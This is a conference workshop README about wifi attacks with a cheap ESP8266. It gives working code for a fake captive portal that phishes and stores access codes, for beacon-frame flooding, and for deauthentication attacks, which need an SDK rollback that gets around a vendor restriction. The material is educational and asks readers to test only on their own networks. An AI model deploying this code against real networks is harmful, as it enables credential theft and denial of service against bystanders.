# Wifi hacking with a 4 dollar microcontroller
This repository contains code and documentation for my workshop 'Wifi hacking with a 4 dollar microcontroller' held on Hacktivity 2016.

## Introduction

The ESP8266 is a wifi enabled microcontroller, which is popular among makers thanks to its low price: the base module costs ~$2 and you can get one with USB connector for $4. In this Workshop I will show you three hacks:
1. **Fake captive portal** - Captive portals are widely used in hotels and other public networks, where the wifi network is open, but upon connection a login page is showed to the user. We will see how to setup a fake captive portal and collect the login credentials. This exercises will show the basic capabilities of the microcontroller. 
2. **Send beacon frames** - These packets are used to introduce wifi networks, so if we send them with random SSID and MAC, whenever someone scans for wifi they will see a lot of new wifi networks, but they will not be able to connect to them. 
3. **Send deauthentication frames** - We will continue with raw packets, and see how to send deauthentication packets to a client to make them drop their connection.

### About ESP8266

The ESP8266 is a low-cost Wi-Fi chip with full TCP/IP stack and MCU (Micro Controller Unit) capability produced by Shanghai-based Chinese manufacturer, [Espressif Systems](https://espressif.com/en). 

Technical details:

* 32-bit RISC CPU: Tensilica Xtensa LX106 running at 80 MHz
* 64 KiB of instruction RAM, 96 KiB of data RAM
* External QSPI flash - 512 KiB to 4 MiB (up to 16 MiB is supported)
* IEEE 802.11 b/g/n Wi-Fi
* Integrated TR switch, balun, LNA, power amplifier and matching network
* WEP or WPA/WPA2 authentication, or open networks
* 16 GPIO pins
* SPI, I²C,
* I²S interfaces with DMA (sharing pins with GPIO)
* UART on dedicated pins, plus a transmit-only UART can be enabled on GPIO2
* 1 10-bit ADC

Source and more info: [Wikipedia](https://en.wikipedia.org/wiki/ESP8266), [Espressif](https://espressif.com/en/products/hardware/esp8266ex/overview).

## Setting up the environment

1. Download the Arduino IDE from [arduino.cc](https://www.arduino.cc/en/Main/Software)
2. Start Arduino IDE, go to File > Preferences and add `http://arduino.esp8266.com/stable/package_esp8266com_index.json` under `Additional board manager`.
3. Go to Tools > Board > Board Manager, search for ESP8266 and install it.
4. Go to Tools > Board and select `Generic ESP8266 module` (if you have the WeMos D1, select `WeMos D1 (retired)`).

### Test the environment setup

To test the setup let's upload two simple example: blink and WifiScan.

#### Blink

1. Go to File > Examples > ESP8266 > Blink
2. Connect ESP8266 to your computer and select the right port under Tools > Port.
3. Click Upload
4. While it compiles (and before upload) press and **hold** the flash button (on the ESP8266) and press reset once, to make the microcontroller enter flash mode. If the upload fails, check the port. If still fails, make sure it enters flash mode. Hold flash and press reset multiple times before it starts to upload. (If you have the WeMos D1 or on other ESP without flash button, you can just simply press Upload and wait. If it fails first, just repeat.)
5. The ESP8266 should blink with its build in led.
6. Bonus: change it to blink faster, try to find an other build in LED (pin definition from the slides might help).

#### WifiScan

1. Go to File > Examples > ESP8266Wifi > WifiScan
2. Upload it as before
3. Go to Tools > Serial Monitor and set the Baudrate to 115200 in the bottom right corner
4. Wait a few seconds and see the nearby Wifi networks listed.
5. Bonus: display other information on the Wifi networks, for example channel. (hint: [ESP8266WiFi.h](https://github.com/esp8266/Arduino/blob/4897e0006b5b0123a2fa31f67b14a3fff65ce561/libraries/ESP8266WiFi/src/ESP8266WiFi.h)).

## Fake captive portal

### The scenario

You are staying in the imaginary Hotel Hacktivity. It has an open wifi `HotelHacktivity` but upon connection you are faced with the following captive portal to enter your access code:

!["Captive portal of Hotel Hacktivity"](https://github.com/markszabo/Hacktivity2016/raw/master/img/hotelhacktivity.png "Captive portal of Hotel Hacktivity")

Every guest receives an access code, but you have lost yours. Can you get someone else's code?

### The code

Open Examples > DNSServer > CaptivePortal, and upload it.

Connect to the Wifi `DNSServer CaptivePortal example` and go to any http website (eg. [bbc.com](http://www.bbc.com/) or [hotelhacktivity.com](http://www.hotelhacktivity.com/).

Change the name of the network in the 18th line: `WiFi.softAP("DNSServer CaptivePortal example");`. In reality we would set it to `HotelHacktivity` but to avoid collusion with others, please set it to something else (eg. add a random number to the end like `HotelHacktivity5943`). Upload & test.

Let's add the `login.php`! Open Examples > ESP8266WebServer > HelloServer to see an example.

Based on HelloServer add the following lines between `webServer.onNotFound([](){...});` and `webServer.begin()`:
```C++
webServer.on("/login.php", []() {
  webServer.send(200, "text/html", "TODO: implement login form here");
});
```

Upload, connect and go to [anysite.com/login.php](http://anysite.com/login.php).

Add the actual login page. In real life we would save the html code of the actual login page, now let's use my code. Declare the following new variable outside any function (eg. after `String responseHTML`):
```C++
String login = ""
"<!DOCTYPE html>"
"<html>"
"<head>"
"  <title>Login</title>"
"  <meta charset=\"utf-8\">"
"  <style>"
"    body {"
"      color: #FFFFFF;"
"      background: rgb(0, 132, 121);"
"      margin: 0px;"
"    }"
"    #header {"
"      padding: 30px;"
"      font-size: 40px;"
"      background: rgb(36, 35, 51);"
"    }"
"    #login {"
"      text-align:center;"
"      padding: 100px;"
"      background: rgb(0, 132, 121);"
"    }"
"    #submit {"
"      padding: 10px;"
"    }"
"  </style>"
"</head>"
"<body>"
"<div id=\"header\">"
"  <img src=\""
"https://hacktivity.com/images/news/170x170/9e13bf40.jpg"
"\" width=\"60px\" height=\"60px\"> Hotel Hacktivity Wifi Service"
"</div>"
"<div id=\"login\">"
"  <h2>Please enter your access code:</h2>"
"  <form action=\"login.php\" method=\"get\">"
"   <div>Access code: <input type=\"text\" name=\"code\" autofocus></div>"
"   <div id=\"submit\"><input type=\"submit\" value=\"Submit\"></div>"
"  </form>"
"</div>"
"</body>"
"</html>";
```

Also change the previously added code to use this variable (replace `"TODO: implement login form here"` with `login`):
```C++
webServer.on("/login.php", []() {
  webServer.send(200, "text/html", login);
});
```

Upload and test: go to [anysite.com/login.php](http://anysite.com/login.php) to see the login page, and go to [anysite.com](http://anysite.com/) to see the original captive portal.

Instead of the original captive portal, we need it to redirect the visitors to http://www.hotelhacktivity.com/login.php. So let's change `webServer.onNotFound` into the following:
```C++
webServer.onNotFound([]() {
  webServer.sendHeader("Location", String("http://www.hotelhacktivity.com/login.php"), true);
  webServer.send(302, "text/plain", "");
});
```
This will send an http response with code 302 (redirect) and Location set to  `http://www.hotelhacktivity.com/login.php` if any page but `/login.php` is visited.

Upload, test the redirect. If you look closely, the image in the header is not displayed (or if it is, then it's from cache). Fortunately html supports base64 encoded images. To do this download the image, resize and compress it (I used jpg quality 50% in Gimp), and then base64 encode it (either use a website like [b64.io](http://b64.io/) or [base64-image.de](https://www.base64-image.de/) or use this linux command: `cat HacktivityLogoSmall.jpg | base64`. Now you can just use my code, change the `login` string into the following:
```C++
String login = ""
"<!DOCTYPE html>"
"<html>"
"<head>"
"  <title>Login</title>"
"  <meta charset=\"utf-8\">"
"  <style>"
"    body {"
"      color: #FFFFFF;"
"      background: rgb(0, 132, 121);"
"      margin: 0px;"
"    }"
"    #header {"
"      padding: 30px;"
"      font-size: 40px;"
"      background: rgb(36, 35, 51);"
"    }"
"    #login {"
"      text-align:center;"
"      padding: 100px;"
"      background: rgb(0, 132, 121);"
"    }"
"    #submit {"
"      padding: 10px;"
"    }"
"  </style>"
"</head>"
"<body>"
"<div id=\"header\">"
"  <img src=\""
"data:image/jpeg;base64,"
"/9j/4AAQSkZJRgABAQEASABIAAD/4QecaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hw"
"YWNrZXQgYmVnaW49J++7vycgaWQ9J1c1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCc/Pgo8eDp4bXBt"
"ZXRhIHhtbG5zOng9J2Fkb2JlOm5zOm1ldGEvJz4KPHJkZjpSREYgeG1sbnM6cmRmPSdodHRwOi8v"
"d3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjJz4KCiA8cmRmOkRlc2NyaXB0aW9u"
"IHhtbG5zOmRjPSdodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyc+CiAgPGRjOmZvcm1h"
"dD5pbWFnZS9qcGVnPC9kYzpmb3JtYXQ+CiAgPGRjOnRpdGxlPgogICA8cmRmOkFsdD4KICAgIDxy"
"ZGY6bGkgeG1sOmxhbmc9J3gtZGVmYXVsdCc+eC1kZWZhdWx0PC9yZGY6bGk+CiAgIDwvcmRmOkFs"
"dD4KICA8L2RjOnRpdGxlPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiB4"
"bWxuczp4bXA9J2h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8nPgogIDx4bXA6TWV0YWRhdGFE"
"YXRlPjIwMTUtMDQtMTZUMjM6Mzg6NDcrMDI6MDA8L3htcDpNZXRhZGF0YURhdGU+CiAgPHhtcDpN"
"b2RpZnlEYXRlPjIwMTUtMDQtMTZUMjE6Mzg6NTdaPC94bXA6TW9kaWZ5RGF0ZT4KICA8eG1wOkNy"
"ZWF0ZURhdGU+MjAxNS0wNC0xNlQyMzozODo0NyswMjowMDwveG1wOkNyZWF0ZURhdGU+CiAgPHht"
"cDpDcmVhdG9yVG9vbD5BZG9iZSBJbGx1c3RyYXRvciBDQyAoTWFjaW50b3NoKTwveG1wOkNyZWF0"
"b3JUb29sPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiB4bWxuczp4bXBN"
"TT0naHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyc+CiAgPHhtcE1NOkluc3RhbmNlSUQ+"
"eG1wLmlpZDphN2ExNWViYi00NTRiLTRiMzUtODU2ZC1hYTZiMjkwYjcyNDU8L3htcE1NOkluc3Rh"
"bmNlSUQ+CiAgPHhtcE1NOkRvY3VtZW50SUQgcmRmOnJlc291cmNlPSd4bXAuZGlkOmE3YTE1ZWJi"
"LTQ1NGItNGIzNS04NTZkLWFhNmIyOTBiNzI0NScgLz4KICA8eG1wTU06T3JpZ2luYWxEb2N1bWVu"
"dElEPnV1aWQ6NUQyMDg5MjQ5M0JGREIxMTkxNEE4NTkwRDMxNTA4Qzg8L3htcE1NOk9yaWdpbmFs"
"RG9jdW1lbnRJRD4KICA8eG1wTU06UmVuZGl0aW9uQ2xhc3M+cHJvb2Y6cGRmPC94bXBNTTpSZW5k"
"aXRpb25DbGFzcz4KICA8eG1wTU06RGVyaXZlZEZyb20gcmRmOnBhcnNlVHlwZT0nUmVzb3VyY2Un"
"CiAgIHhtbG5zOnN0UmVmPSdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3Vy"
"Y2VSZWYjJz4KICAgPHN0UmVmOmluc3RhbmNlSUQ+eG1wLmlpZDo3NGRmMjU2Mi0zNzQyLTRmODEt"
"ODA0YS02NGYzNmUwYjc0ZmM8L3N0UmVmOmluc3RhbmNlSUQ+CiAgIDxzdFJlZjpkb2N1bWVudElE"
"PnhtcC5kaWQ6NzRkZjI1NjItMzc0Mi00ZjgxLTgwNGEtNjRmMzZlMGI3NGZjPC9zdFJlZjpkb2N1"
"bWVudElEPgogICA8c3RSZWY6b3JpZ2luYWxEb2N1bWVudElEPnV1aWQ6NUQyMDg5MjQ5M0JGREIx"
"MTkxNEE4NTkwRDMxNTA4Qzg8L3N0UmVmOm9yaWdpbmFsRG9jdW1lbnRJRD4KICAgPHN0UmVmOnJl"
"bmRpdGlvbkNsYXNzPnByb29mOnBkZjwvc3RSZWY6cmVuZGl0aW9uQ2xhc3M+CiAgPC94bXBNTTpE"
"ZXJpdmVkRnJvbT4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24geG1sbnM6"
"aWxsdXN0cmF0b3I9J2h0dHA6Ly9ucy5hZG9iZS5jb20vaWxsdXN0cmF0b3IvMS4wLyc+CiAgPGls"
"bHVzdHJhdG9yOlN0YXJ0dXBQcm9maWxlPlByaW50PC9pbGx1c3RyYXRvcjpTdGFydHVwUHJvZmls"
"ZT4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24geG1sbnM6cGRmPSdodHRw"
"Oi8vbnMuYWRvYmUuY29tL3BkZi8xLjMvJz4KICA8cGRmOlByb2R1Y2VyPkFkb2JlIFBERiBsaWJy"
"YXJ5IDkuMDA8L3BkZjpQcm9kdWNlcj4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKPC9yZGY6UkRGPgo8"
"L3g6eG1wbWV0YT4KPD94cGFja2V0IGVuZD0ncic/Pgr/2wBDABALDA4MChAODQ4SERATGCgaGBYW"
"GDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8a"
"Gi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/"
"wgARCAA8ADwDAREAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAgUAAwQBBv/EABQBAQAAAAAA"
"AAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAX4hNYAZkN4wBPCjcAMUD0fnDzZuMRtKjSMwTwo3FA3K"
"TYPzgjLQCwEuGYJ5YuKS0pNo/OCgIM4EXms4QhCEIdP/xAAiEAABBAEEAgMAAAAAAAAAAAACAAED"
"BBMFEBIxFBURITD/2gAIAQEAAQUCXsXVe3mUds5Bgt5l7F1Vs59n6VBUz4DR20zvbzRVaw0i80VW"
"sNIgnYwqTNNs/SobUFWJmi0zvaGwUyrWMqgmKZVrGRQSnMFSfK6fqmXEqCqlxGgqx8Y9M72zE4tP"
"9MRE2UvkCIngdy/L/8QAFBEBAAAAAAAAAAAAAAAAAAAAYP/aAAgBAwEBPwEB/8QAFBEBAAAAAAAA"
"AAAAAAAAAAAAYP/aAAgBAgEBPwEB/8QALBAAAQMBBgQFBQAAAAAAAAAAAgABEQMQEiEiUXIxM0GB"
"BCAjYqEwMjRhwf/aAAgBAQAGPwJcv5RZIutPFGTUsBbVHki608Vy/lFliPJV2qq/t4Kttsqdrfxw"
"RxSYYZcgUfpMMMjJvDjlRRTYI08lXbZV2qs2rKp2tJmohg0o8gtDdEUUgwR+mI3W6InGiGCPIwxp"
"ae1Vdqqv7VV2qq2rfx1U7W8tr0DGCJ2uDllh1wQ4A0lEXeCi6OZ4bD9oPtzT0TyzNDxh9L//xAAm"
"EAABAwMDAwUBAAAAAAAAAAABABEhEDFBYXHwUbHBIIGh0eGR/9oACAEBAAE/ITAWlUnlQQykolTe"
"QBaVSG63y9LlL0nvA9gmfqt4G9DYrifiN3HxlBpozr+KDyuMqNtuZH0j1sN1LlL6NiyB6fwVwN6G"
"xRhyLHLK+pByHA56os8h1LojHUowhhd1LiOxyxXpHtVWLljF8nhcDehsUIQJZKS7n+BOw48CbnNk"
"UgQ7J3dx0BiEi10N7dlCQiXad0GPHFci59DD1f/aAAwDAQACAAMAAAAQAggAkAEAEkAgkEAAEkEA"
"kAkAEgEgkEkg/8QAFBEBAAAAAAAAAAAAAAAAAAAAYP/aAAgBAwEBPxAB/8QAFBEBAAAAAAAAAAAA"
"AAAAAAAAYP/aAAgBAgEBPxAB/8QAJRABAAIBAgUFAQEAAAAAAAAAAQARITFREEFhgaFxkcHR8LHx"
"/9oACAEBAAE/EFY7Fz8T6iJRyK3o0lpFd4q602GEJHLrc2NOk/E+oChUsZrvobcPBZZvPKfM0J+D"
"Loos7jvHZ+Ocs3nj8B01XRP9AgEyRudrggkAosBTBmqzc34cEr0yuATN55sQSptlDlfQ24eC8PKf"
"MNCfi9YaNtZ2bf6B3nj8B02tEstQMYWyjvmALypexl0ud4CtDwygoYI6sPtLZ0AbrTx7X4jNf3K/"
"rh4LLI4zLqlQP6xXm5vmM+tYvel+JT8t5pKHGdHI9Y8fgOmORLw/o1rVA3VqGu8ugmtvsuZYIiBz"
"RSzL4FKXuoHbDua4v0M3Lznn7oGi4DNLgp3E2L6LSegt0dONG06BKNpRtKNuP//Z"
"\" width=\"60px\" height=\"60px\"> Hotel Hacktivity Wifi Service"
"</div>"
"<div id=\"login\">"
"  <h2>Please enter your access code:</h2>"
"  <form action=\"login.php\" method=\"get\">"
"   <div>Access code: <input type=\"text\" name=\"code\" autofocus></div>"
"   <div id=\"submit\"><input type=\"submit\" value=\"Submit\"></div>"
"  </form>"
"</div>"
"</body>"
"</html>";
``` 

Upload and test.

It should look good, but one functionality is still missing: the entered access codes are not saved. Let's change the form action to login2.php (in the `login` string change the `<form action=\"login.php\" method=\"get\">` line to `<form action=\"login2.php\" method=\"get\">`. Declare a new variable before `setup()` with `String sniffed = "";` and add the following code after `webServer.on("/login.php", [](){...});` to handle the requests to login2.php:
```C++
webServer.on("/login2.php", []() {
  if(webServer.args() > 0 && webServer.argName(0) == "code") {
    sniffed += webServer.arg(0) + "\n";
    }
  webServer.send(200, "text/plain", "Error - unknown error occured, please try again later.");
});
```
If login2.php is queried with at least one argument and the name of the first argument is code, then it will save the value of that argument to the variable `sniffed`. Then we display an error to the user. As you can see we can access the number of GET/POST parameters by `webServer.args()`, the name of the ith parameter by `webServer.argName(i)` and its value as `webServer.arg(i)`.

Upload and test to see the error message upon entering any code.

There is one final step missing: we need to get the access codes entered by others. To do this add the following lines after `webServer.on("/login2.php", [](){...});`:
```C++
webServer.on("/collect.php", []() {
  webServer.send(200, "text/plain", sniffed);
});
```
Now if we go to [/collect.php](http://www.hotelhacktivity.com/collect.php), it will display all the collected access codes. Upload and check it.

**Bonus**: if the ESP8266 restarts, all the previously recorded access codes are gone. Implement some permanent storage for the codes! (Hint: use [EEPROM](https://github.com/esp8266/Arduino/tree/master/libraries/EEPROM) or [ESP8266's filesystem](https://github.com/esp8266/Arduino/blob/master/doc/filesystem.md).

## Beacon frames

### Introduction

"Beacon frame is one of the management frames in IEEE 802.11 based WLANs. It contains all the information about the network. Beacon frames are transmitted periodically to announce the presence of a wireless LAN. Beacon frames are transmitted by the Access Point (AP) in an infrastructure Basic service set (BSS). In IBSS network beacon generation is distributed among the stations." Source & more info: [Wikipedia](https://en.wikipedia.org/wiki/Beacon_frame)

![Beacon frames in action - from Wikipedia](https://upload.wikimedia.org/wikipedia/commons/7/7b/802.11_Beacon_frame.gif)

### Simpler code

Let's open the [BasicBeacon code](https://github.com/markszabo/Hacktivity2016/blob/master/BasicBeacon/BasicBeacon.ino) and upload it. After upload, you will see a lot of wifi networks with random 6 character SSID appearing. Let's check the code!

The code starts with the following block:
```C++
extern "C" {
  #include "user_interface.h"
}
```
This is used to expose sdk functions which are otherwise not accessible from the Arduino IDE. We will use the `wifi_send_pkt_freedom()` function. Then it defines a big buffer for the beacon packet. In the `setup()` it sets the module to `STATION_MODE` and enables promiscuous mode. These are needed to perform packet injection with the `wifi_send_pkt_freedom()`. In the `loop()` it sets the channel to a random number, replaces the source MAC and BSSID with a random MAC, and the SSID with a random 6 character string. Then we send the frame 3 times with `wifi_send_pkt_freedom()`.

### Beacon frame's structure

![Beacon frame](https://mrncciew.files.wordpress.com/2014/10/cwap-mgmt-beacon-01.png)

Let's observe our frame and identify the parts! More info and image source [here](https://mrncciew.com/2014/10/08/802-11-mgmt-beacon-frame/).
```C++
uint8_t packet[128] = {
0x80, 0x00, //frame control
0x00, 0x00, //duration - will be overwritten by ESP8266
/*4*/ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //DA - destination address, broadcast in this case
/*10*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //SA - source address, will be overwritten later
 /*16*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - same as SA in this case, will be overwritten later
 /*22*/ 0xc0, 0x6c, //Seq-ctl
//Frame body starts here
/*24*/ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp
 /*32*/ 0x64, 0x00, //beacon interval
 /*34*/ 0x01, 0x04, //capability info
 /* SSID */
0x00, //ID meaning SSID
0x06, //length
0x72, 0x72, 0x72, 0x72, 0x72, 0x72, //SSID name
0x01, //ID meaning Supported rates
0x08, //length
0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //Supported rates
0x03, //ID meaning channel (?)
0x01, //length
0x04 //will be overwritten later with the actual channel
};
```

### Extended code

Based on this let's extend the basic for arbitrary long SSID. You can do it on your own or use my code from [here](https://github.com/markszabo/Hacktivity2016/blob/master/FakeBeaconESP8266/FakeBeaconESP8266.ino)

## Deauthentication frames

Ideally sending deauthentication frames would be as easy as beacon frames. However the developers of ESP8266, Espressif doesn't want to support this feature, so the `wifi_send_pkt_freedom()` is limited to beacon frames. For some time it was only a rumor, but then someone from Espressif confirmed it [here](http://bbs.espressif.com/viewtopic.php?t=1357):

>1. wifi_send_pkt_freedom can not send management packets and encrypted packets, beacon is one kind of the management packets. We add this limitation because it may effect other devices.
>
>2. If you really want to send beacon, please start from "0x80, 0x00 ... " *(...)* If you start from "0x00,0x00", wifi_send_pkt_freedom will detect the 80211 header and find out that it's a management packet, and send fail.
>
>3. wifi_send_pkt_freedom data format : start from 802.11 header, no more extra data in the front.

But they made a mistake. Officially they have added the functionality in SDK 1.4 with the limitation already in place. But someone discovered, that the function is already presented in the binaries of SDK 1.3, only the function descriptions are missing from the header file. So let's get SDK 1.3 and add the missing declarations to the header file.

## Setting up the environment

1. Close all opened arduino IDE.

1. Download arduino 1.6.5 from [arduino.cc](https://www.arduino.cc/en/Main/OldSoftwareReleases#previous) and decompress it.

2. Enter the decompressed directory, then the `hardware` directory: `cd arduino-1.6.5-r5/hardware`

3. Create a new directory called `esp8266com`: `mkdir esp8266com`

4. Enter the new directory: `cd esp8266com`

5. Clone the git repository into a new folder called `esp8266`: `git clone https://github.com/esp8266/Arduino.git esp8266` (Alternatively [download it from github](https://github.com/esp8266/Arduino/archive/5653b9a59baa25094c891d030214aa956bec452c.zip), decompress and rename it.)

6. Enter the new directory: `cd esp8266`

7. Revert back to the last commit with SDK 1.3: `git checkout 5653b9a59baa25094c891d030214aa956bec452c` (If you have downloaded the zip directly using the link above, you can skip this step, since you already have this version.)

8. Enter the `tools` directory: `cd tools`

9. Run this python script to get some additional binaries: `python get.py`

## Test the environment

Now let's start the freshly downloaded arduino IDE. Open the previous `FakeBeaconESP8266` project, select the ESP8266 board and try to compile it. It should fail with an error: `'wifi_send_pkt_freedom' was not declared in this scope` since the definition of this function is missing from the header file. If it does not fail, then the IDE might uses the previously downloaded newest SDK. On linux this is located under `~/.arduino15/packages/esp8266`. You can simply delete this folder and restart the arduino IDE. You can also delete it from the Board Manager, though I haven't done it that way. 

Also you might not be able to see the ESP8266 boards under Tools > Board. It can be due to the fact that the IDE misses the `boards.txt` under `hardware/esp8266com/esp8266`. If that's your case, simply [download the latest `boards.txt`](https://raw.githubusercontent.com/esp8266/Arduino/master/boards.txt) and place it there.

If you have the `'wifi_send_pkt_freedom' was not declared in this scope` but no other error, then you can edit the header file. It is located under `arduino-1.6.5-r5/hardware/esp8266com/esp8266/tools/sdk/include/user_interface.h`. Simply add the following lines to the end of the file before the last line (`#endif`):
```C++
typedef void (*freedom_outside_cb_t)(uint8 status);
int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
void wifi_unregister_send_pkt_freedom_cb(void);
int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq); 
```
Save the file and try to recompile the `FakeBeaconESP8266` project. It should succeed now.

## The code

Download the code from [here](https://github.com/markszabo/Hacktivity2016/blob/master/deauth/deauth.ino). It sets up a timer to periodically send the deauth frames. It also sets up a promiscous callback function with `wifi_set_promiscuous_rx_cb(promisc_cb)` to sniff the traffic and parse the MAC addresses and sequence numbers out of it.

To avoid disturbing other's wifi connection, please do not use the public wifi, but set up your own, **open** wifi with your phone and connect to it with your computer. Then note the MAC address of your computer and phone and add it to the 15th and 16th line:
```C++
uint8_t phone[6] = {0x58,0x44,0x98,0x13,0x80,0x6C};
uint8_t pc[6] = {0x1C,0x65,0x9D,0xB7,0x8D,0xC6};
```

Then ping your phone from your computer and upload the code to the ESP8266. Open Serial Monitor and you should see it picking up your MAC address and the ping should start to fail. If you power it off, ping should be back.
